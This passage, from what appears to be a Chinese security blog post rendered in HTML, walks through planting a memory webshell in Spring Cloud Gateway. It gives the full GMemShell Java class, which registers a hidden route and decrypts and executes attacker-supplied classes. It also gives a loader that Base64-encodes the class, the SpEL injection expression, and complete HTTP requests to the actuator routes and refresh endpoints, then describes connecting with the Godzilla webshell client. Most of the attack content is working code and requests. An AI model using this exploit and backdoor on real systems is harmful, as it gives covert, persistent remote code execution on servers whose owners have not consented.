class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.reactive.result.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GMemShell</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String, Object&gt; store = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">pass</span> <span class="operator">=</span> <span class="string">&quot;test&quot;</span>, md5, key = <span class="string">&quot;342df5b036b2f281&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">doInject</span><span class="params">(Object obj, String path)</span> &#123;</span><br><span class="line">    String msg;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      md5 = md5(pass + key);</span><br><span class="line">      <span class="type">Method</span> <span class="variable">registerHandlerMethod</span> <span class="operator">=</span> obj.getClass().getDeclaredMethod(<span class="string">&quot;registerHandlerMethod&quot;</span>, Object.class, Method.class, RequestMappingInfo.class);</span><br><span class="line">      registerHandlerMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      <span class="type">Method</span> <span class="variable">executeCommand</span> <span class="operator">=</span> GMemShell.class.getDeclaredMethod(<span class="string">&quot;cmd&quot;</span>, ServerWebExchange.class);</span><br><span class="line">      <span class="type">RequestMappingInfo</span> <span class="variable">requestMappingInfo</span> <span class="operator">=</span> RequestMappingInfo.paths(path).build();</span><br><span class="line">      registerHandlerMethod.invoke(obj, <span class="keyword">new</span> <span class="title class_">GMemShell</span>(), executeCommand, requestMappingInfo);</span><br><span class="line">      msg = <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      msg = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> msg;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> Class <span class="title function_">defineClass</span><span class="params">(<span class="type">byte</span>[] classbytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[<span class="number">0</span>], Thread.currentThread().getContextClassLoader());</span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">    method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> (Class) method.invoke(urlClassLoader, classbytes, <span class="number">0</span>, classbytes.length);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s, <span class="type">boolean</span> m) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      javax.crypto.<span class="type">Cipher</span> <span class="variable">c</span> <span class="operator">=</span> javax.crypto.Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">      c.init(m ? <span class="number">1</span> : <span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(key.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">      <span class="keyword">return</span> c.doFinal(s);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">md5</span><span class="params">(String s)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      java.security.MessageDigest m;</span><br><span class="line">      m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">      m.update(s.getBytes(), <span class="number">0</span>, s.length());</span><br><span class="line">      ret = <span class="keyword">new</span> <span class="title class_">java</span>.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bs)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Class base64;</span><br><span class="line">    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">      <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);</span><br><span class="line">      value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class&#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.newInstance();</span><br><span class="line">        value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">byte</span>[].class&#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] base64Decode(String bs) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Class base64;</span><br><span class="line">    <span class="type">byte</span>[] value = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">      <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getDecoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);</span><br><span class="line">      value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.newInstance();</span><br><span class="line">        value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;bs&#125;);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@PostMapping(&quot;/cmd&quot;)</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">synchronized</span> ResponseEntity <span class="title function_">cmd</span><span class="params">(</span></span><br><span class="line"><span class="params">    ServerWebExchange pdata)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">Object</span> <span class="variable">bufferStream</span> <span class="operator">=</span> pdata.getFormData().flatMap(c -&gt; &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> c.getFirst(pass);</span><br><span class="line">          <span class="type">byte</span>[] data = x(base64Decode(id), <span class="literal">false</span>);</span><br><span class="line">          <span class="keyword">if</span> (store.get(<span class="string">&quot;payload&quot;</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">            store.put(<span class="string">&quot;payload&quot;</span>, defineClass(data));</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            store.put(<span class="string">&quot;parameters&quot;</span>, data);</span><br><span class="line">            java.io.<span class="type">ByteArrayOutputStream</span> <span class="variable">arrOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">f</span> <span class="operator">=</span> ((Class) store.get(<span class="string">&quot;payload&quot;</span>)).newInstance();</span><br><span class="line">            f.equals(arrOut);</span><br><span class="line">            f.equals(data);</span><br><span class="line">            result.append(md5.substring(<span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">            f.toString();</span><br><span class="line">            result.append(base64Encode(x(arrOut.toByteArray(), <span class="literal">true</span>)));</span><br><span class="line">            result.append(md5.substring(<span class="number">16</span>));</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">          result.append(ex.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Mono.just(result.toString());</span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>(bufferStream, HttpStatus.OK);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>(ex.getMessage(), HttpStatus.OK);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>最后使用 Maven 进行编译，得到<code>GMemShell.class</code></p>
+<figure class="highlight bash"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-3swk8bls7tkuwt"></i><span>  Bash  </span><div class="collapse show" id="collapse-3swk8bls7tkuwt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mvn compile</span><br></pre></td></tr></table></div></figure>
+<p><a data-fancybox="gallery" data-src="/assets/Spring-Cloud-Gateway-MemShell-6.png" data-caption="Spring-Cloud-Gateway-MemShell-6"><img src="/assets/Spring-Cloud-Gateway-MemShell-6.png" alt="Spring-Cloud-Gateway-MemShell-6"></a></p>
+<p>编写加载器，加载该 Class 文件并转换为 Base64 编码</p>
+<figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-iucapdls7tkuwt"></i><span>  Java  </span><div class="collapse show" id="collapse-iucapdls7tkuwt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoaderClass</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] load(String path) &#123;</span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      fis = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);</span><br><span class="line">      baos = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">      <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">      <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">while</span> ((len = fis.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        baos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">        baos.flush();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (fis != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123; fis.close(); &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e) &#123; e.printStackTrace(); &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (baos != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123; baos.close(); &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e) &#123; e.printStackTrace(); &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] code = LoaderClass.load(<span class="string">&quot;target/classes/GMemShell.class&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(code);</span><br><span class="line">    System.out.println(temp);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+<p><a data-fancybox="gallery" data-src="/assets/Spring-Cloud-Gateway-MemShell-7.png" data-caption="Spring-Cloud-Gateway-MemShell-7"><img src="/assets/Spring-Cloud-Gateway-MemShell-7.png" alt="Spring-Cloud-Gateway-MemShell-7"></a></p>
+<h3 id="注入1"><a href="#注入1" class="headerlink" title="注入1"></a>注入1</h3><blockquote>
+<p>此处使用了 c0ny1 师傅对默认 Payload 进行优化后的 <a target="_blank" rel="noopener" href="https://gv7.me/articles/2022/the-spring-cloud-gateway-inject-memshell-through-spel-expressions/#0x01-%E9%AB%98%E5%8F%AF%E7%94%A8Payload">高可用Payload</a></p>
+</blockquote>
+<p>这里需要向这个 SpEL 表达式传入前面编码后的 Base64 字符串以及访问路由，如<code>/gmem</code></p>
+<figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-z43hnals7tkuwt"></i><span>  Java  </span><div class="collapse show" id="collapse-z43hnals7tkuwt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(<span class="string">&#x27;GMemShell&#x27;</span>,T(org.springframework.util.Base64Utils).decodeFromString(<span class="string">&#x27;&lt;Base64字符串&gt;&#x27;</span>),<span class="keyword">new</span> <span class="title class_">javax</span>.management.loading.MLet(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[<span class="number">0</span>],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(<span class="meta">@requestMappingHandlerMapping</span>, <span class="string">&#x27;&lt;/路由&gt;&#x27;</span>)&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<p>创建路由</p>
+<figure class="highlight http"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-kkycgjls7tkuwt"></i><span>  Http  </span><div class="collapse show" id="collapse-kkycgjls7tkuwt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>&lt;IP:Port&gt;</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>10770</span><br><span class="line"></span><br><span class="line"><span class="language-coffeescript">&#123;</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;hacktest&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;filters&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Result&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;<span class="subst">#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(<span class="string">&#x27;GMemShell&#x27;</span>,T(org.springframework.util.Base64Utils).decodeFromString(<span class="string">&#x27;&lt;Base64字符串&gt;&#x27;</span>),<span class="keyword">new</span> javax.management.loading.MLet(<span class="keyword">new</span> java.net.URL[<span class="number">0</span>],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping, <span class="string">&#x27;/gmem&#x27;</span>)&#125;</span>&quot;</span></span></span><br><span class="line"><span class="language-coffeescript">    &#125;</span></span><br><span class="line"><span class="language-coffeescript">  &#125;],</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;uri&quot;</span>: <span class="string">&quot;http://example.com&quot;</span></span></span><br><span class="line"><span class="language-coffeescript">&#125;</span></span><br></pre></td></tr></table></div></figure>
+<p><a data-fancybox="gallery" data-src="/assets/Spring-Cloud-Gateway-MemShell-8.png" data-caption="Spring-Cloud-Gateway-MemShell-8"><img src="/assets/Spring-Cloud-Gateway-MemShell-8.png" alt="Spring-Cloud-Gateway-MemShell-8"></a></p>
+<p>刷新路由</p>
+<figure class="highlight http"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-4kofz3ls7tkuwt"></i><span>  Http  </span><div class="collapse show" id="collapse-4kofz3ls7tkuwt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>&lt;IP:Port&gt;</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+<p><a data-fancybox="gallery" data-src="/assets/Spring-Cloud-Gateway-MemShell-9.png" data-caption="Spring-Cloud-Gateway-MemShell-9"><img src="/assets/Spring-Cloud-Gateway-MemShell-9.png" alt="Spring-Cloud-Gateway-MemShell-9"></a></p>
+<p>使用浏览器访问发现路由已经打进去了</p>
+<p><a data-fancybox="gallery" data-src="/assets/Spring-Cloud-Gateway-MemShell-10.png" data-caption="Spring-Cloud-Gateway-MemShell-10"><img src="/assets/Spring-Cloud-Gateway-MemShell-10.png" alt="Spring-Cloud-Gateway-MemShell-10"></a></p>
+<p>使用哥斯拉进行连接</p>
+<ul>
+<li>URL 为 Payload 中注入的<code>path</code></li>
+<li>密码为前面设置的<code>pass</code>，密钥为<code>key</code>的明文</li>
+</ul>
+<p><a data-fancybox="gallery" data-src="/assets/Spring-Cloud-Gateway-MemShell-11.png" data-caption="Spring-Cloud-Gateway-MemShell-11"><img src="/assets/Spring-Cloud-Gateway-MemShell-11.png" alt="Spring-Cloud-Gateway-MemShell-11"></a></p>
+<h3 id="注入2"><a href="#注入2" class="headerlink" title="注入2"></a>注入2</h3><blockquote>
+<p>魔改添加自定义<code>pass</code>和<code>key</code>功能，这样只需编译一次 Class 并生成对应的 Base64 编码，每次使用时只需传入不同的参数即可，而不用每次都编译</p>
+</blockquote>
+<p>因为在前面<code>GMemShell.java</code>这个文件中，<code>pass/key</code>是全局静态变量，所以不能像<code>path</code>变量这样直接向<code>doInject</code>方法传参，所以一开始的想法是打算从 SpEL 表达式入手</p>
+<figure class="highlight http"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-nvwvs4ls7tkuwt"></i><span>  Http  </span><div class="collapse show" id="collapse-nvwvs4ls7tkuwt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;GMemShell&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;&lt;Base64字符串&gt;&#x27;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping, &#x27;&lt;/路由&gt;&#x27;)&#125;</span><br></pre></td></tr></table></div></figure>
+<p>从<code>org.springframework.cglib.core.ReflectUtils</code>这个类可以看到，上面的表达式中向这个类中的<code>defineClass</code>方法传入了3个参数：<code>className</code>类名、<code>byte[]</code>字节数组、<code>loader</code>类加载器，没有找到可以利用的点</p>
+<p><a data-fancybox="gallery" data-src="/assets/Spring-Cloud-Gateway-MemShell-12.png" data-caption="Spring-Cloud-Gateway-MemShell-12"><img src="/assets/Spring-Cloud-Gateway-MemShell-12.png" alt="Spring-Cloud-Gateway-MemShell-12"></a></p>
+<p>后来想到其实可以先定义全局变量<code>pass</code>和<code>key</code>，然后通过向<code>doInject</code>方法中传递密码<code>passKey</code>和密钥<code>keyStr</code>参数并进行覆盖即可<del>（前面想得复杂了）</del>。另外<code>keyStr</code>需要进行 MD5 加密并截取前 16 位，这里加密部分可以直接调用 Spring 中的<code>DigestUtils</code>类，所以还需要引入该类。（参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/1fe26fc3643a">Java MD5 算法实现</a>）</p>
